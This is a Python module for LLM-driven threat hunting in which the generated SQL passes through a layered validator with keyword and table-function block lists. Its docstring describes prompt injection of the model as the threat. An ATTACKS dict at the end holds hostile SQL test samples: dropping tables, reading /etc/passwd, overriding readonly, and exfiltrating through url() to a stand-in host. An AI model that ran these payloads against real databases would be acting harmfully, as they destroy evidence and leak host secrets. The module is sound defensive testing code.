"""Natural-language threat hunting with a layered guardrail on LLM-generated SQL.

Threat model: the model's output is attacker-influenceable (prompt injection via log content
or the question itself), so generated SQL is treated as untrusted input.

Layer 1  validate_sql(): single SELECT, no comments, no SETTINGS, no table functions
         (file/url/s3/remote... can read local files or exfiltrate even under readonly=2),
         tables restricted to an allowlist.
Layer 2  execution wrapped in an outer SELECT ... LIMIT.
Layer 3  database-side: a dedicated user whose profile pins readonly=1 CONST (server mode),
         or a query-level readonly=1 in embedded mode. Query-level alone is NOT enough:
         a later "SETTINGS readonly=0" overrides it, which is why layer 1 rejects SETTINGS.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

from .llm import LLM
from .store import Store

ALLOWED_TABLES = {"agent_events", "agent_controls"}
FORBIDDEN_KEYWORDS = [
    "insert", "alter", "drop", "create", "truncate", "rename", "attach", "detach", "grant",
    "revoke", "kill", "system", "optimize", "settings", "outfile", "delete", "update", "exchange",
    "set", "use",
]
TABLE_FUNCTIONS = [
    "file", "url", "urlcluster", "s3", "s3cluster", "gcs", "azureblobstorage", "remote",
    "remotesecure", "cluster", "clusterallreplicas", "mysql", "postgresql", "mongodb", "redis",
    "sqlite", "jdbc", "odbc", "hdfs", "executable", "input", "dictionary", "merge", "numbers",
    "deltalake", "iceberg", "hudi", "generaterandom", "loop",
]

SCHEMA_HINT = """Table agent_events(ts DateTime64, agent_id, agent_role, session_id, action_type
['tool_call','file_read','file_write','http_request','credential_use'], tool, target, dest_host,
bytes_out UInt64, token_scope ['read','write','admin'], outcome ['allowed','denied'], prompt_hash,
content_snippet). Table agent_controls(ts, agent_id, control, scope, detection_id, reason)."""

NL2SQL_SYSTEM = f"""You translate threat-hunting questions into ONE ClickHouse SELECT query.
{SCHEMA_HINT}
Return only SQL, no prose, no markdown fences, no SETTINGS clause, no table functions."""


class GuardrailViolation(Exception):
    def __init__(self, layer: str, reason: str):
        super().__init__(f"[{layer}] {reason}")
        self.layer, self.reason = layer, reason


def _strip_literals(sql: str) -> str:
    return re.sub(r"'(?:[^'\\]|\\.)*'", "''", sql)


def validate_sql(sql: str) -> str:
    sql = sql.strip().strip("`").strip()
    if sql.lower().startswith("sql"):
        sql = sql[3:].strip()
    sql = sql.rstrip(";").strip()
    bare = _strip_literals(sql)
    low = bare.lower()

    if "--" in bare or "/*" in bare or "#" in bare:
        raise GuardrailViolation("L1", "comments are not allowed")
    if ";" in bare:
        raise GuardrailViolation("L1", "multiple statements are not allowed")
    if not re.match(r"^\s*(select|with)\b", low):
        raise GuardrailViolation("L1", "only SELECT / WITH queries are allowed")
    for kw in FORBIDDEN_KEYWORDS:
        if re.search(rf"\b{kw}\b", low):
            raise GuardrailViolation("L1", f"forbidden keyword: {kw.upper()}")
    for fn in TABLE_FUNCTIONS:
        if re.search(rf"\b{fn}\s*\(", low):
            raise GuardrailViolation("L1", f"table function not allowed: {fn}()")

    ctes = set(re.findall(r"\b([a-z_][a-z0-9_]*)\s+as\s*\(", low))
    for ref in re.findall(r"\b(?:from|join)\s+([a-z_][a-z0-9_.]*)", low):
        if ref not in ALLOWED_TABLES and ref not in ctes:
            raise GuardrailViolation("L1", f"table not in allowlist: {ref}")
    return sql


def _mock_nl2sql(question: str) -> str:
    q = question.lower()
    if "metadata" in q or "169.254" in q:
        return ("SELECT agent_id, count() AS hits FROM agent_events "
                "WHERE dest_host = '169.254.169.254' GROUP BY agent_id ORDER BY hits DESC")
    if "admin" in q:
        return ("SELECT agent_role, agent_id, count() AS uses FROM agent_events "
                "WHERE token_scope = 'admin' GROUP BY agent_role, agent_id ORDER BY uses DESC")
    if "denied" in q or "blocked" in q:
        return ("SELECT ts, agent_id, action_type, dest_host, target FROM agent_events "
                "WHERE outcome = 'denied' ORDER BY ts")
    return ("SELECT dest_host, uniqExact(agent_id) AS agents, sum(bytes_out) AS bytes "
            "FROM agent_events WHERE action_type = 'http_request' "
            "GROUP BY dest_host ORDER BY agents ASC, bytes DESC")


@dataclass
class HuntResult:
    question: str
    sql: str
    rows: list[dict]
    elapsed_ms: float
    blocked: GuardrailViolation | None = None


def run_sql(store: Store, sql: str, limit: int = 1000) -> tuple[list[dict], float]:
    safe = validate_sql(sql)
    res = store.query(f"SELECT * FROM (\n{safe}\n) LIMIT {int(limit)}", hunt=True)
    return res.rows, res.elapsed_ms


def hunt(store: Store, question: str, llm: LLM | None = None) -> HuntResult:
    llm = llm or LLM()
    sql = llm.chat(NL2SQL_SYSTEM, question, max_tokens=400) or _mock_nl2sql(question)
    try:
        rows, ms = run_sql(store, sql)
        return HuntResult(question, sql, rows, ms)
    except GuardrailViolation as v:
        return HuntResult(question, sql, [], 0.0, blocked=v)


# Hostile SQL a compromised or injected model might emit. Used by the demo and tests.
ATTACKS = {
    "destroy evidence": "DROP TABLE agent_events",
    "read host secrets": "SELECT * FROM file('/etc/passwd', 'LineAsString')",
    "override readonly": "SELECT count() FROM agent_events SETTINGS readonly = 0",
    "exfiltrate via url()": "SELECT * FROM url('https://paste-drop.xyz/c?d=' || 'x', 'CSV', 'a String')",
    "enumerate users": "SELECT name FROM system.users",
    "stacked statement": "SELECT 1; DROP TABLE agent_controls",
    "comment smuggling": "SELECT 1 /* */ FROM agent_events",
}
